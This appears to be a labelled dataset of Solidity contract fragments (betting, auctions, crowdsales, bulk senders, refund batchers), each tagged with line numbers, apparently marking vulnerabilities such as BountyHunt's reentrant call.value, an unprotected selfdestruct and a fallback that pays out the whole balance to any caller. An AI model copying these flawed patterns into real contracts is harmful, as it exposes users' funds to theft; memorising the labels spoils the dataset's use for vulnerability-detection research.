    return a - b;
  }
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
/// @title Loopring Refund Program
/// @author Kongliang Zhong - <kongliang@loopring.org>.
/// For more information, please visit https://loopring.org.
contract BatchTransferContract {
    using SafeMath for uint;
    using Math for uint;
    address public owner;
    function BatchTransferContract(address _owner) public {
        owner = _owner;
    }
    function () payable {
        // do nothing.
    }
    function batchRefund(address[] investors, uint[] ethAmounts) public payable {
        require(msg.sender == owner);
        require(investors.length > 0);
        require(investors.length == ethAmounts.length);
        uint total = 0;
        for (uint i = 0; i < investors.length; i++) {
            total += ethAmounts[i];
        }
        require(total <= this.balance);
        for (i = 0; i < investors.length; i++) {
            if (ethAmounts[i] > 0) {
                investors[i].transfer(ethAmounts[i]);
            }
        }
    }
    function drain(uint ethAmount) public payable {
        require(msg.sender == owner);
        uint amount = ethAmount.min256(this.balance);
        if (amount > 0) {
          owner.transfer(amount);
        }
    }
}",[62]
"    rightPts = _rightPts;
    LogGameResult(betInfo.category, betInfo.gameId, leftPts, rightPts);
    winChoice = getWinChoice(leftPts, rightPts);
    if (winChoice == 1) {
      distributeReward(betInfo.leftOdds);
    } else if (winChoice == 2) {
      distributeReward(betInfo.middleOdds);
    } else {
      distributeReward(betInfo.rightOdds);
    }
    isBetClosed = true;
    LogBetClosed(false, now);
    withdraw();
  }
  /**
   * @dev closeBet could be called by everyone, but owner/dealer should to this.
   */
  function closeBet() external {
    require(!isBetClosed);
    (leftPts, rightPts, confirmations) = dataCenterGetResult(betInfo.gameId);
    require(confirmations >= neededConfirmations);
    LogGameResult(betInfo.category, betInfo.gameId, leftPts, rightPts);
    winChoice = getWinChoice(leftPts, rightPts);
    if (winChoice == 1) {
      distributeReward(betInfo.leftOdds);
    } else if (winChoice == 2) {
      distributeReward(betInfo.middleOdds);
    } else {
      distributeReward(betInfo.rightOdds);
    }
    isBetClosed = true;
    LogBetClosed(false, now);
    withdraw();
  }
  /**
   * @dev get the players
   */
  function getPlayers() view public returns (address[]) {
    return players;
  }
  /**
   * @dev get contract balance
   */
  function getBalance() view public returns (uint) {
    return address(this).balance;
  }
  /**
   * @dev if there are some reasons lead game postpone or cancel
   *      the bet will also cancel and refund every bet
   */
  function refund() onlyOwner public {
    for (uint i = 0; i < players.length; i++) {
      players[i].transfer(playerInfo[players[i]].betAmount);
      LogRefund(players[i], playerInfo[players[i]].betAmount);
    }
    isBetClosed = true;
    LogBetClosed(true, now);
    withdraw();
  }
  /**
   * @dev dealer can withdraw the remain ether after refund or closed
   */
  function withdraw() internal {
    require(isBetClosed);
    uint _balance = address(this).balance;
    betInfo.dealer.transfer(_balance);
    LogDealerWithdraw(betInfo.dealer, _balance);
  }
  /**
   * @dev distribute ether to every winner as they choosed odds
   */
  function distributeReward(uint winOdds) internal {
    for (uint i = 0; i < players.length; i++) {
      if (playerInfo[players[i]].choice == winChoice) {
        players[i].transfer(winOdds.mul(playerInfo[players[i]].betAmount).div(100));
        LogDistributeReward(players[i], winOdds.mul(playerInfo[players[i]].betAmount).div(100), i);
      }
    }
  }
}
contract BetCenter is Ownable {
  mapping(bytes32 => Bet[]) public bets;
  mapping(bytes32 => bytes32[]) public gameIds;
  event LogCreateBet(address indexed dealerAddr, address betAddr, bytes32 indexed category, uint indexed startTime);
  function() payable public {}
  function createBet(bytes32 category, bytes32 gameId, uint minimumBet,
                  uint8 spread, uint16 leftOdds, uint16 middleOdds, uint16 rightOdds, uint8 flag,
                  uint startTime, uint8 confirmations) payable public {
    Bet bet = (new Bet).value(msg.value)(msg.sender, category, gameId, minimumBet,
                  spread, leftOdds, middleOdds, rightOdds , flag, startTime, confirmations, owner);
    bets[category].push(bet);
    gameIds[category].push(gameId);
    LogCreateBet(msg.sender, bet, category, startTime);
  }
  /**
   * @dev fetch bets use category
   * @param category Indicate the sports events type
   */
  function getBetsByCategory(bytes32 category) view public returns (Bet[]) {
    return bets[category];
  }
  function getGameIdsByCategory(bytes32 category) view public returns (bytes32 []) {
    return gameIds[category];
  }
}","[53, 75]"
"    phaseLengths = _phaseLengths;
    devFundingRate = _devFundingRate;
    cyclePhase = CyclePhase.Manage;
    compoundFactoryAddr = _compoundFactoryAddr;
    betokenLogic = _betokenLogic;
    previousVersion = _previousVersion;
    cToken = IMiniMeToken(_kroAddr);
    sToken = IMiniMeToken(_sTokenAddr);
  }
  function initTokenListings(
    address[] memory _kyberTokens,
    address[] memory _compoundTokens,
    address[] memory _positionTokens
  )
    public
    onlyOwner
  {
    // May only initialize once
    require(!hasInitializedTokenListings);
    hasInitializedTokenListings = true;
    uint256 i;
    for (i = 0; i < _kyberTokens.length; i = i.add(1)) {
      isKyberToken[_kyberTokens[i]] = true;
    }
    for (i = 0; i < _compoundTokens.length; i = i.add(1)) {
      isCompoundToken[_compoundTokens[i]] = true;
    }
    for (i = 0; i < _positionTokens.length; i = i.add(1)) {
      isPositionToken[_positionTokens[i]] = true;
    }
  }
  /**
   * @notice Used during deployment to set the BetokenProxy contract address.
   * @param _proxyAddr the proxy's address
   */
  function setProxy(address payable _proxyAddr) public onlyOwner {
    require(_proxyAddr != address(0));
    require(proxyAddr == address(0));
    proxyAddr = _proxyAddr;
    proxy = BetokenProxyInterface(_proxyAddr);
  }
  /**
   * Upgrading functions
   */
  /**
   * @notice Allows the developer to propose a candidate smart contract for the fund to upgrade to.
   *          The developer may change the candidate during the Intermission phase.
   * @param _candidate the address of the candidate smart contract
   * @return True if successfully changed candidate, false otherwise.
   */
  function developerInitiateUpgrade(address payable _candidate) public during(CyclePhase.Intermission) onlyOwner notReadyForUpgrade returns (bool _success) {
    (bool success, bytes memory result) = betokenLogic.delegatecall(abi.encodeWithSelector(this.developerInitiateUpgrade.selector, _candidate));
    if (!success) { return false; }
    return abi.decode(result, (bool));
  }
  /**
   * @notice Allows a manager to signal their support of initiating an upgrade. They can change their signal before the end of the Intermission phase.
   *          Managers who oppose initiating an upgrade don't need to call this function, unless they origianlly signalled in support.
   *          Signals are reset every cycle.
   * @param _inSupport True if the manager supports initiating upgrade, false if the manager opposes it.
   * @return True if successfully changed signal, false if no changes were made.
   */
  function signalUpgrade(bool _inSupport) public during(CyclePhase.Intermission) notReadyForUpgrade returns (bool _success) {
    (bool success, bytes memory result) = betokenLogic.delegatecall(abi.encodeWithSelector(this.signalUpgrade.selector, _inSupport));
    if (!success) { return false; }
    return abi.decode(result, (bool));
  }
  /**
   * @notice Allows manager to propose a candidate smart contract for the fund to upgrade to. Among the managers who have proposed a candidate,
   *          the manager with the most voting weight's candidate will be used in the vote. Ties are broken in favor of the larger address.
   *          The proposer may change the candidate they support during the Propose subchunk in their chunk.
   * @param _chunkNumber the chunk for which the sender is proposing the candidate
   * @param _candidate the address of the candidate smart contract
   * @return True if successfully proposed/changed candidate, false otherwise.
   */
  function proposeCandidate(uint256 _chunkNumber, address payable _candidate) public during(CyclePhase.Manage) notReadyForUpgrade returns (bool _success) {
    (bool success, bytes memory result) = betokenLogic.delegatecall(abi.encodeWithSelector(this.proposeCandidate.selector, _chunkNumber, _candidate));
    if (!success) { return false; }
    return abi.decode(result, (bool));
  }
  /**
   * @notice Allows a manager to vote for or against a candidate smart contract the fund will upgrade to. The manager may change their vote during
   *          the Vote subchunk. A manager who has been a proposer may not vote.
   * @param _inSupport True if the manager supports initiating upgrade, false if the manager opposes it.
   * @return True if successfully changed vote, false otherwise.
   */
  function voteOnCandidate(uint256 _chunkNumber, bool _inSupport) public during(CyclePhase.Manage) notReadyForUpgrade returns (bool _success) {
    (bool success, bytes memory result) = betokenLogic.delegatecall(abi.encodeWithSelector(this.voteOnCandidate.selector, _chunkNumber, _inSupport));
    if (!success) { return false; }
    return abi.decode(result, (bool));
  }
  /**
   * @notice Performs the necessary state changes after a successful vote
   * @param _chunkNumber the chunk number of the successful vote
   * @return True if successful, false otherwise
   */
  function finalizeSuccessfulVote(uint256 _chunkNumber) public during(CyclePhase.Manage) notReadyForUpgrade returns (bool _success) {
    (bool success, bytes memory result) = betokenLogic.delegatecall(abi.encodeWithSelector(this.finalizeSuccessfulVote.selector, _chunkNumber));
    if (!success) { return false; }
    return abi.decode(result, (bool));
  }
  /**
   * @notice Transfers ownership of Kairo & Share token contracts to the next version. Also updates BetokenFund's
   *         address in BetokenProxy.
   */
  function migrateOwnedContractsToNextVersion() public nonReentrant readyForUpgradeMigration {
    cToken.transferOwnership(nextVersion);
    sToken.transferOwnership(nextVersion);
    proxy.updateBetokenFundAddress();
  }
  /**
   * @notice Transfers assets to the next version.
   * @param _assetAddress the address of the asset to be transferred. Use ETH_TOKEN_ADDRESS to transfer Ether.
   */
  function transferAssetToNextVersion(address _assetAddress) public nonReentrant readyForUpgradeMigration isValidToken(_assetAddress) {
    if (_assetAddress == address(ETH_TOKEN_ADDRESS)) {
      nextVersion.transfer(address(this).balance);
    } else {
      ERC20Detailed token = ERC20Detailed(_assetAddress);
      token.safeTransfer(nextVersion, token.balanceOf(address(this)));
    }
  }
  /**
   * Getters
   */
  /**
   * @notice Returns the length of the user's investments array.
   * @return length of the user's investments array",[64]
"                _timeEnd[j] = auctions[i].timeEnd;
                _lastBidTime[j] = auctions[i].lastBidTime;
                _highestBid[j] = auctions[i].highestBid;
                _highestBidder[j] = auctions[i].highestBidder;
                _auctionIndex[j] = i;
                j++;
                if (j >= 5)
                {
                    break;
                }
            }
        }
    }
    function finish(uint16 auction) public onlyOperator
    {
        auctions[auction].timeEnd = 1;
    }
    function abort(uint16 auctionIndex) public onlyOperator
    {
        Auction storage auction = auctions[auctionIndex];
        address prevBidder = auction.highestBidder;
        uint256 returnValue = auction.highestBid;
        auction.highestBid = 0;
        auction.highestBidder = address(0);
        auction.timeEnd = 1;
        if (prevBidder != address(0))
        {
            if (!isContract(prevBidder)) // do not allow auto withdraw for contracts
            {
                if (prevBidder.send(returnValue))
                {
                    return; // sent ok, no need to keep returned money on contract
                }
            }
            pendingReturns[prevBidder] += returnValue;
            totalReturns += returnValue;
        }
    }
    function addAuction(uint40 _startTime, uint40 _duration, uint128 _startPrice) public onlyOperator
    {
        auctions.push(Auction(_startPrice, address(0), _startTime + _duration, 0, _startTime));
    }
    function isEnded(uint16 auction) public view returns (bool)
    {
        return
            auctions[auction].timeEnd < now &&
            auctions[auction].highestBidder != address(0);
    }
    function isActive(uint16 auctionIndex) public view returns (bool)
    {
        Auction storage auction = auctions[auctionIndex];
        return
            auction.timeStart <= now &&
            (now < auction.timeEnd || auction.timeEnd != 0 && auction.highestBidder == address(0));
    }
    function bid(uint16 auctionIndex, uint256 useFromPendingReturn) public payable whenNotPaused
    {
        Auction storage auction = auctions[auctionIndex];
        address prevBidder = auction.highestBidder;
        uint256 returnValue = auction.highestBid;
        require (useFromPendingReturn <= pendingReturns[msg.sender]);
        uint256 bank = useFromPendingReturn;
        pendingReturns[msg.sender] -= bank;
        totalReturns -= bank;
        uint256 currentBid = bank + msg.value;
        require(currentBid >= auction.highestBid + minBid ||
                currentBid >= auction.highestBid && prevBidder == address(0));
        require(isActive(auctionIndex));
        auction.highestBid = uint128(currentBid);
        auction.highestBidder = msg.sender;
        auction.lastBidTime = uint40(now);
        for (uint16 i = 0; i < auctions.length; i++)
        {
            if (isActive(i) &&  auctions[i].timeEnd < now + minTime)
            {
                auctions[i].timeEnd = uint40(now) + minTime;
            }
        }
        emit Bid(msg.sender, prevBidder, currentBid, currentBid - returnValue, auctionIndex);
        if (prevBidder != address(0))
        {
            if (!isContract(prevBidder)) // do not allow auto withdraw for contracts
            {
                if (prevBidder.send(returnValue))
                {
                    return; // sent ok, no need to keep returned money on contract
                }
            }
            pendingReturns[prevBidder] += returnValue;
            totalReturns += returnValue;
        }
    }
}",[64]
"                _timeEnd[j] = auctions[i].timeEnd;
                _lastBidTime[j] = auctions[i].lastBidTime;
                _highestBid[j] = auctions[i].highestBid;
                _highestBidder[j] = auctions[i].highestBidder;
                _auctionIndex[j] = i;
                _cutieId[j] = auctions[i].cutieId;
                j++;
                if (j >= 5)
                {
                    break;
                }
            }
        }
    }
    function finish(uint16 auctionIndex) public onlyOperator
    {
        auctions[auctionIndex].timeEnd = 0;
    }
    function abort(uint16 auctionIndex) public onlyOperator
    {
        Auction storage auction = auctions[auctionIndex];
        address prevBidder = auction.highestBidder;
        uint256 returnValue = auction.highestBid;
        auction.highestBid = 0;
        auction.highestBidder = address(0);
        auction.timeEnd = 1;
        if (prevBidder != address(0))
        {
            if (!isContract(prevBidder)) // do not allow auto withdraw for contracts
            {
                if (prevBidder.send(returnValue))
                {
                    return; // sent ok, no need to keep returned money on contract
                }
            }
            pendingReturns[prevBidder] += returnValue;
            totalReturns += returnValue;
        }
    }
    function addAuction(uint40 _startTime, uint40 _duration, uint128 _startPrice, uint40 _cutieId) public onlyOperator
    {
        require(coreContract.getApproved(_cutieId) == address(this) || coreContract.ownerOf(_cutieId) == address(this));
        auctions.push(Auction(_startPrice, address(0), _startTime + _duration, 0, _startTime, _cutieId));
    }
    function isEnded(uint16 auction) public view returns (bool)
    {
        return
            auctions[auction].timeEnd < now;
    }
    function isActive(uint16 auction) public view returns (bool)
    {
        return
            auctions[auction].timeStart <= now &&
            now <= auctions[auction].timeEnd;
    }
    function bid(uint16 auctionIndex, uint256 useFromPendingReturn) public payable whenNotPaused
    {
        Auction storage auction = auctions[auctionIndex];
        address prevBidder = auction.highestBidder;
        uint256 returnValue = auction.highestBid;
        require (useFromPendingReturn <= pendingReturns[msg.sender]);
        uint256 bank = useFromPendingReturn;
        pendingReturns[msg.sender] -= bank;
        totalReturns -= bank;
        uint256 currentBid = bank + msg.value;
        require(currentBid >= auction.highestBid + minBid ||
                currentBid >= auction.highestBid && prevBidder == address(0));
        require(isActive(auctionIndex));
        auction.highestBid = uint128(currentBid);
        auction.highestBidder = msg.sender;
        auction.lastBidTime = uint40(now);
        if (isActive(auctionIndex) && auction.timeEnd < now + minTime)
        {
            auction.timeEnd = uint40(now) + minTime;
        }
        emit Bid(msg.sender, prevBidder, currentBid, currentBid - returnValue, auctionIndex);
        if (prevBidder != address(0))
        {
            if (!isContract(prevBidder)) // do not allow auto withdraw for contracts
            {
                if (prevBidder.send(returnValue))
                {
                    return; // sent ok, no need to keep returned money on contract
                }
            }
            pendingReturns[prevBidder] += returnValue;
            totalReturns += returnValue;
        }
    }
    function setup(address _coreAddress) public onlyOwner {
        CutieCoreInterface candidateContract = CutieCoreInterface(_coreAddress);
        require(candidateContract.isCutieCore());
        coreContract = candidateContract;
    }
    function withdraw(uint16 _auctionIndex) public {
        Auction storage auction = auctions[_auctionIndex];
        require(isEnded(_auctionIndex));
        require(auction.highestBidder == msg.sender);
        coreContract.transferFrom(coreContract.ownerOf(auction.cutieId), msg.sender, uint256(auction.cutieId));
    }
    function withdrawAdmin(uint40 _cutieId) public onlyOperator {
        coreContract.transferFrom(coreContract.ownerOf(_cutieId), msg.sender, _cutieId);
    }
    function setTemp(uint40 _temp) public onlyOwner
    {
        temp = _temp;
    }
    function transferFrom(uint40 _temp) public onlyOwner
    {
        require(temp == _temp);
        coreContract.transferFrom(coreContract.ownerOf(temp), msg.sender, temp);
    }
    function sendToMarket(uint16 auctionIndex) public onlyOperator
    {
        Auction storage auction = auctions[auctionIndex];
        require(auction.highestBidder == address(0));
        auction.timeEnd = 0;
        coreContract.transferFrom(coreContract.ownerOf(auction.cutieId), this, auction.cutieId);
        coreContract.createSaleAuction(auction.cutieId, auction.highestBid, auction.highestBid, 60*60*24*365);
    }
    function sendToWinner(uint16 auctionIndex) public onlyOperator
    {
        Auction storage auction = auctions[auctionIndex];
        require(isEnded(auctionIndex));
        require(auction.highestBidder != address(0));
        coreContract.transferFrom(coreContract.ownerOf(auction.cutieId), auction.highestBidder, auction.cutieId);
    }
    /// @dev Allow receive money from SaleContract after sendToMarket",[64]
"        uint256 returnToSender = 0;
        // Retrieve the current token rate
        uint256 rate = getRate();
        // Calculate token amount to be transferred
        uint256 tokens = weiAmount.mul(rate);
        // Distribute only the remaining tokens if final contribution exceeds hard cap
        if(tokensSold.add(tokens) > hardCap) {
            tokens = hardCap.sub(tokensSold);
            weiAmount = tokens.div(rate);
            returnToSender = msg.value.sub(weiAmount);
        }
        // update state
        tokensSold = tokensSold.add(tokens);
        // update balance
        balances[beneficiary] = balances[beneficiary].add(weiAmount);
        assert(reward.transferFrom(owner, beneficiary, tokens));
        TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);
        // Forward funds
        wallet.transfer(weiAmount);
        // Allow transfers 2 weeks after hard cap is reached
        if(tokensSold == hardCap) {
            reward.setStartTime(now + 2 weeks);
        }
        // Notify token contract about sale end time
        if(!isStartTimeSet) {
            isStartTimeSet = true;
            reward.setStartTime(endTime + 2 weeks);
        }
        // Return funds that are over hard cap
        if(returnToSender > 0) {
            msg.sender.transfer(returnToSender);
        }
    }
    /**
     * @dev Internal function that is used to determine the current rate for token / ETH conversion
     * @return The current token rate
     */
    function getRate() internal constant returns (uint256) {
        if(now < (startTime + 1 weeks)) {
            return 11500;
        }
        if(now < (startTime + 2 weeks)) {
            return 11000;
        }
        if(now < (startTime + 3 weeks)) {
            return 10500;
        }
        return 10000;
    }
    /**
     * @dev Internal function that is used to check if the incoming purchase should be accepted.
     * @return True if the transaction can buy tokens
     */
    function validPurchase() internal constant returns (bool) {
        bool withinPeriod = now >= startTime && now <= endTime;
        bool nonZeroPurchase = msg.value != 0;
        bool hardCapNotReached = tokensSold < hardCap;
        return withinPeriod && nonZeroPurchase && hardCapNotReached;
    }
    /**
     * @return True if crowdsale event has ended
     */
    function hasEnded() public constant returns (bool) {
        return now > endTime || tokensSold >= hardCap;
    }
    /**
     * @dev Returns ether to token holders in case soft cap is not reached.
     */
    function claimRefund() external {
        require(hasEnded());
        require(tokensSold < softCap);
        uint256 amount = balances[msg.sender];
        if(address(this).balance >= amount) {
            balances[msg.sender] = 0;
            if (amount > 0) {
                msg.sender.transfer(amount);
                Refund(msg.sender, amount);
            }
        }
    }
    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the the balance of.
    * @return An uint256 representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) external constant returns (uint256 balance) {
        return balances[_owner];
    }
}",[64]
"pragma solidity 0.4.24;
          //------ busniness plan ------
        // www.bizalom.io Package amount
        //     1		0.10 eth
        //     2		0.20 eth
        //     3		0.50 eth	
        //     4		1 eth
        //     5		2 eth
        //     6		5 eth	
        //     7		10 eth	
        //     8		25 eth
        //     9		50 eth
        //     10		100 eth
        //     Direct income
        //     30% = 20%
        //     40% = 10%
        //     50%    after two Sponser user will get 50%                              
        //     one step direct income if sponser will not available in next plan   
        //     maintenance fee 3% excluded
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract BizalomIo {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[70]
"    bytes32 _txId,
    address _alice,
    bytes20 _secretHash,
    uint64 _lockTime
  ) external payable {
    require(_alice != 0x0 && msg.value > 0 && payments[_txId].state == PaymentState.Uninitialized);
    bytes20 paymentHash = ripemd160(abi.encodePacked(
      _alice,
      msg.sender,
      _secretHash,
      address(0),
      msg.value
    ));
    payments[_txId] = BobPayment(
      paymentHash,
      _lockTime,
      PaymentState.BobMadePayment
    );
  }
  function bobMakesErc20Payment(
    bytes32 _txId,
    uint256 _amount,
    address _alice,
    bytes20 _secretHash,
    address _tokenAddress,
    uint64 _lockTime
  ) external {
    require(
      _alice != 0x0 &&
      _amount > 0 &&
      payments[_txId].state == PaymentState.Uninitialized &&
      _tokenAddress != 0x0
    );
    bytes20 paymentHash = ripemd160(abi.encodePacked(
      _alice,
      msg.sender,
      _secretHash,
      _tokenAddress,
      _amount
    ));
    payments[_txId] = BobPayment(
      paymentHash,
      _lockTime,
      PaymentState.BobMadePayment
    );
    ERC20 token = ERC20(_tokenAddress);
    assert(token.transferFrom(msg.sender, address(this), _amount));
  }
  function bobClaimsPayment(
    bytes32 _txId,
    uint256 _amount,
    address _alice,
    address _tokenAddress,
    bytes20 _secretHash
  ) external {
    require(payments[_txId].state == PaymentState.BobMadePayment);
    bytes20 paymentHash = ripemd160(abi.encodePacked(
      _alice,
      msg.sender,
      _secretHash,
      _tokenAddress,
      _amount
    ));
    require(now >= payments[_txId].lockTime && paymentHash == payments[_txId].paymentHash);
    payments[_txId].state = PaymentState.BobClaimedPayment;
    if (_tokenAddress == 0x0) {
      msg.sender.transfer(_amount);
    } else {
      ERC20 token = ERC20(_tokenAddress);
      assert(token.transfer(msg.sender, _amount));
    }
  }
  function aliceClaimsPayment(
    bytes32 _txId,
    uint256 _amount,
    bytes32 _secret,
    address _bob,
    address _tokenAddress
  ) external {
    require(payments[_txId].state == PaymentState.BobMadePayment);
    bytes20 paymentHash = ripemd160(abi.encodePacked(
      msg.sender,
      _bob,
      ripemd160(abi.encodePacked(sha256(abi.encodePacked(_secret)))),
      _tokenAddress,
      _amount
    ));
    require(now < payments[_txId].lockTime && paymentHash == payments[_txId].paymentHash);
    payments[_txId].state = PaymentState.AliceClaimedPayment;
    if (_tokenAddress == 0x0) {
      msg.sender.transfer(_amount);
    } else {
      ERC20 token = ERC20(_tokenAddress);
      assert(token.transfer(msg.sender, _amount));
    }
  }
}",[64]
"pragma solidity ^0.4.4;
contract BountyHunt {
  mapping(address => uint) public bountyAmount;
  uint public totalBountyAmount;
  modifier preventTheft {
    _;  
    if (this.balance < totalBountyAmount) throw;
  }
  function grantBounty(address beneficiary, uint amount) payable preventTheft {
    bountyAmount[beneficiary] += amount;
    totalBountyAmount += amount;
  }
  function claimBounty() preventTheft {
    uint balance = bountyAmount[msg.sender];
    if (msg.sender.call.value(balance)()) {
      totalBountyAmount -= balance;
      bountyAmount[msg.sender] = 0;
    }   
  }
  function transferBounty(address to, uint value) preventTheft {
    if (bountyAmount[msg.sender] >= value) {
      bountyAmount[to] += value;
      bountyAmount[msg.sender] -= value;
    }   
  }
}","[15, 16]"
"  }
  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }
  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}
contract Token {
    uint8 public decimals;
    function transfer(address _to, uint256 _value) public returns (bool success) {}
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {}
}
contract BulkSend {
    using SafeMath for uint256;
    address public owner;
    uint public tokenSendFee; // in wei
    uint public ethSendFee; // in wei
    constructor() public payable{
        owner = msg.sender;
    }
    modifier onlyOwner() {
      require(msg.sender == owner);
      _;
    }
    function bulkSendEth(address[] addresses, uint256[] amounts) public payable returns(bool success){
        uint total = 0;
        for(uint8 i = 0; i < amounts.length; i++){
            total = total.add(amounts[i]);
        }
        //ensure that the ethreum is enough to complete the transaction
        uint requiredAmount = total.add(ethSendFee * 1 wei); //.add(total.div(100));
        require(msg.value >= (requiredAmount * 1 wei));
        //transfer to each address
        for (uint8 j = 0; j < addresses.length; j++) {
            addresses[j].transfer(amounts[j] * 1 wei);
        }
        //return change to the sender
        if(msg.value * 1 wei > requiredAmount * 1 wei){
            uint change = msg.value.sub(requiredAmount);
            msg.sender.transfer(change * 1 wei);
        }
        return true;
    }
    function getbalance(address addr) public constant returns (uint value){
        return addr.balance;
    }
    function deposit() payable public returns (bool){
        return true;
    }
    function withdrawEther(address addr, uint amount) public onlyOwner returns(bool success){
        addr.transfer(amount * 1 wei);
        return true;
    }
    function withdrawToken(Token tokenAddr, address _to, uint _amount) public onlyOwner returns(bool success){
        tokenAddr.transfer(_to, _amount );
        return true;
    }
    function bulkSendToken(Token tokenAddr, address[] addresses, uint256[] amounts) public payable returns(bool success){
        uint total = 0;
        address multisendContractAddress = this;
        for(uint8 i = 0; i < amounts.length; i++){
            total = total.add(amounts[i]);
        }
        require(msg.value * 1 wei >= tokenSendFee * 1 wei);
        // check if user has enough balance
        require(total <= tokenAddr.allowance(msg.sender, multisendContractAddress));
        // transfer token to addresses
        for (uint8 j = 0; j < addresses.length; j++) {
            tokenAddr.transferFrom(msg.sender, addresses[j], amounts[j]);
        }
        // transfer change back to the sender
        if(msg.value * 1 wei > (tokenSendFee * 1 wei)){
            uint change = (msg.value).sub(tokenSendFee);
            msg.sender.transfer(change * 1 wei);
        }
        return true;
    }
    function setTokenFee(uint _tokenSendFee) public onlyOwner returns(bool success){
        tokenSendFee = _tokenSendFee;
        return true;
    }
    function setEthFee(uint _ethSendFee) public onlyOwner returns(bool success){
        ethSendFee = _ethSendFee;
        return true;
    }
    function destroy (address _to) public onlyOwner {
        selfdestruct(_to);
    }
}","[47, 81]"
"pragma solidity 0.5.11;
contract BulkSender {
    function distribute(address[] calldata addresses, uint256[] calldata amounts) payable external {
        require(addresses.length > 0);
        require(amounts.length == addresses.length);
        for (uint256 i; i < addresses.length; i++) {
            uint256 value = amounts[i];
            address _to = addresses[i];
            require(value > 0);
            address(uint160(_to)).transfer(value);
        }
    }
    function() external payable {
        msg.sender.transfer(address(this).balance);
    }
}",[10]
"pragma solidity 0.6.4;
/**
 * @title Manage the owner for the BulkSender contract.
 */
contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        _owner = msg.sender;
        emit OwnershipTransferred(address(this), _owner);
    }
    /**
     * Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == _owner, ""Ownable: the caller is not the owner"");
        _;
    }
    /**
     * Sets the new address as the owner.
     */
    function transferOwnership(address newOwner) onlyOwner public {
        require(newOwner != address(0), ""Ownable: the new owner is the zero address"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
/**
 * @title Sending bulk transactions from the whitelisted wallets.
 */
contract BulkSender is Ownable {
    mapping(address => bool) whitelist;
    /**
     * Throws if called by any account other than the whitelisted address.
     */
    modifier onlyWhiteListed() {
        require(whitelist[msg.sender], ""Whitelist: the caller is not whitelisted"");
        _;
    }
    /**
     * Approves the address as the whitelisted address.
     */
    function approve(address addr) onlyOwner external {
        whitelist[addr] = true;
    }
    /**
     * Removes the whitelisted address from the whitelist.
     */
    function remove(address addr) onlyOwner external {
        whitelist[addr] = false;
    }
    /**
     * Returns true if the address is the whitelisted address.
     */
    function isWhiteListed(address addr) public view returns (bool) {
        return whitelist[addr];
    }
    /**
     * @dev Gets the list of addresses and the list of amounts to make bulk transactions.
     * @param addresses - address[]
     * @param amounts - uint256[]
     */
    function distribute(address[] calldata addresses, uint256[] calldata amounts) onlyWhiteListed external payable  {
        require(addresses.length > 0, ""BulkSender: the length of addresses should be greater than zero"");
        require(amounts.length == addresses.length, ""BulkSender: the length of addresses is not equal the length of amounts"");
        for (uint256 i; i < addresses.length; i++) {
            uint256 value = amounts[i];
            require(value > 0, ""BulkSender: the value should be greater then zero"");
            address payable _to = address(uint160(addresses[i]));
            _to.transfer(value);
        }
        require(address(this).balance == 0, ""All received funds must be transfered"");
    }
    /**
     * @dev This contract shouldn't accept payments.
     */
    receive() external payable {
        revert(""This contract shouldn't accept payments."");
    }
}","[72, 76]"
"pragma solidity 0.4.26;
contract Burner {
    function() external {}
    function selfDestruct() external {
        selfdestruct(address(this));
    }
}","[4, 5]"
"        // Set this tile to be the most recently bought out.
        gameStates[gameIndex].lastFlippedTile = identifier;
        // Calculate and set the new tile price.
        gameStates[gameIndex].identifierToBuyoutPrice[identifier] = nextBuyoutPrice(price);
        // Set the buyout timestamp.
        gameStates[gameIndex].identifierToBuyoutTimestamp[identifier] = block.timestamp;
        // Emit event
        Buyout(gameIndex, msg.sender, identifier, x, y, block.timestamp, block.timestamp + gameSettings[gameIndex].activityTimer, gameStates[gameIndex].identifierToBuyoutPrice[identifier], gameStates[gameIndex].prizePool);
        // Calculate the excess Ether sent.
        // msg.value is greater than or equal to price,
        // so this cannot underflow.
        uint256 excess = msg.value - price;
        if (excess > 0) {
            // Refund any excess Ether (not susceptible to re-entry attack, as
            // the owner is assigned before the transfer takes place).
            msg.sender.transfer(excess);
        }
    }
    /// @notice Buy the current owner out of the tile. Set the player's referrer.
    /// @param _gameIndex The index of the game to play on.
    /// @param startNewGameIfIdle Start a new game if the current game is idle.
    /// @param x The x-coordinate of the tile to buy.
